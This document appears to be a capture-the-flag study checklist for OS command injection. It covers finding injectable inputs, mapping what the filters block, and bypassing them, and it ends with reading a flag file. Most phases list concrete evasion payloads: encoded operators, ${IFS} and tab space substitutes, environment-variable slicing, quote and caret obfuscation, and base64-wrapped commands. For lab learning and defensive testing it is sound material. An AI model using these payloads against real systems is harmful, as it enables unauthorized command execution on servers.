# Command Injection Checklist

**Rule:** Enumerate the filter before bypassing it. Test each layer independently.

## Phase 1 — Find the Injection Point
- [ ] Read the app — curl the page, identify all inputs that likely feed OS commands
- [ ] Note the input context: GET param, POST body, cookie, header
- [ ] Test each input with a single operator (`%0a` first) — does output change?
- [ ] Check DevTools Network tab — no request on error = front-end validation only → bypass with curl/Burp

## Phase 2 — Enumerate the Filter (Do This Before Bypassing)
- [ ] Test each operator **alone** (no command after it):
  - [ ] `%3b` (`;`) → Invalid? Blacklisted
  - [ ] `%0a` (`\n`) → Invalid? Blacklisted (usually NOT — use this)
  - [ ] `%26` (`&`) → Invalid? Blacklisted
  - [ ] `%7c` (`|`) → Invalid? Blacklisted
- [ ] Add **space only** after confirmed operator → Invalid? Space is blacklisted
- [ ] Add **command only** after confirmed operator → Invalid? Command is blacklisted
- [ ] Note: character filter and command filter are TWO independent layers

## Phase 3 — Operator Bypass
- [ ] `%0a` (newline) — almost always works, try first
- [ ] If all operators blocked → escalate to advanced techniques

## Phase 4 — Space Bypass
- [ ] `%09` (tab) — Linux + Windows
- [ ] `${IFS}` — Linux only (use single quotes in curl to prevent local expansion)
- [ ] `{cmd,-arg}` — brace expansion, Linux only

## Phase 5 — Character Bypass (slash, semicolon)
- [ ] Slash: `${PATH:0:1}` (PATH starts with `/`)
- [ ] Slash: `${HOME:0:1}` or `${PWD:0:1}`
- [ ] Semicolon: `${LS_COLORS:10:1}`
- [ ] Windows slash: `%HOMEPATH:~6,-11%` (CMD) or `$env:HOMEPATH[0]` (PowerShell)

## Phase 6 — Command Obfuscation
- [ ] Quote insertion: `w'h'o'am'i` or `w"h"o"am"i` — Linux + Windows
- [ ] `$@` empty expansion: `ca$@t` — Linux only
- [ ] Backslash: `w\ho\am\i` — Linux only
- [ ] Windows caret: `who^ami`
- [ ] Case manipulation: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` — replace spaces with `%09`
- [ ] Reverse: `$(rev<<<'imaohw')` — reverse the command name
- [ ] **Base64 (nuclear option):** encode entire command, use `bash<<<$(base64${IFS}-d<<<BASE64)`

## Phase 7 — Read the Flag
- [ ] Once execution confirmed: `cat${IFS}${PATH:0:1}flag.txt`
- [ ] Or base64 encode: `echo -n 'cat /flag.txt' | base64` → send encoded
- [ ] Find flag if path unknown: encode `find / -name "flag*" 2>/dev/null`

## Pitfall Reminders
- [ ] Use single quotes for curl `-d` arg — prevents local `${IFS}` expansion
- [ ] `wc -c` comparison if grep finds nothing — blind injection may still be working
- [ ] Newline `%0a` is almost never in the blacklist — always try it first
- [ ] Two filter layers exist independently — a passing operator can still fail if command is blacklisted
- [ ] Base64 payload: use `<<< ` not `|` (pipe is often filtered)
